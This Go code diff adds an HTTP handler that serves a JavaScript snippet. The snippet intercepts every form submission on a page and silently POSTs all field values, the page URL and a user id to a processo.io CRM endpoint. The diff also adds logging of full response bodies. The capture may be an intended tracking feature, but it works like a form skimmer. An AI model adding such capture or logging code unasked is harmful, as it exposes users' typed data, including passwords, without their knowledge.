@@ -229,6 +229,26 @@ func AsyncFuncHandler(s module_store.ModuleStoreI) http.HandlerFunc {
 	}
 }
 
+func ScriptHandler(s module_store.ModuleStoreI) http.HandlerFunc {
+	return func(w http.ResponseWriter, r *http.Request) {
+		logs.WithContext(r.Context()).Debug("FuncHandler - Start")
+
+		defer r.Body.Close()
+		ctx := context.WithValue(r.Context(), "allowed_origins", server_handlers.AllowedOrigins)
+		ctx = context.WithValue(ctx, "origin", r.Header.Get("Origin"))
+		// Set the Content-Type to indicate JavaScript
+		w.Header().Set("Content-Type", "application/javascript")
+
+		// Define the JavaScript code without any extra escaping
+		jsCode := `document.addEventListener("submit",function(t){let n=t.target,e=new FormData(n),i=n.action;return!function t(n,e){fetch("https://erufunc.dev.processo.io/processo/func/crm_script?opu=<opu>",{method:"POST",headers:{"Content-Type":"application/json","X-Original-Endpoint":e},body:JSON.stringify({formData:Object.fromEntries(n),timestamp:new Date().toISOString(),pageUrl:window.location.href,userId:"<opu>"})}).catch(t=>console.error("Error cloning submission:",t))}(e,i),!0},!0);`
+
+		// Write the JavaScript code directly to the response
+		w.Write([]byte(jsCode))
+		return
+
+	}
+}
+
 func FuncHandler(s module_store.ModuleStoreI) http.HandlerFunc {
 	return func(w http.ResponseWriter, r *http.Request) {
 		logs.WithContext(r.Context()).Debug("FuncHandler - Start")
@@ -308,7 +328,7 @@ func FuncHandler(s module_store.ModuleStoreI) http.HandlerFunc {
 			}
 			logs.WithContext(r.Context()).Info(fmt.Sprint(respStatusCode))
 			w.WriteHeader(respStatusCode)
-
+			utils.PrintResponseBody(r.Context(), response, "response")
 			_, err = io.Copy(w, response.Body)
 			if err != nil {
 				logs.WithContext(ctx).Error(err.Error())
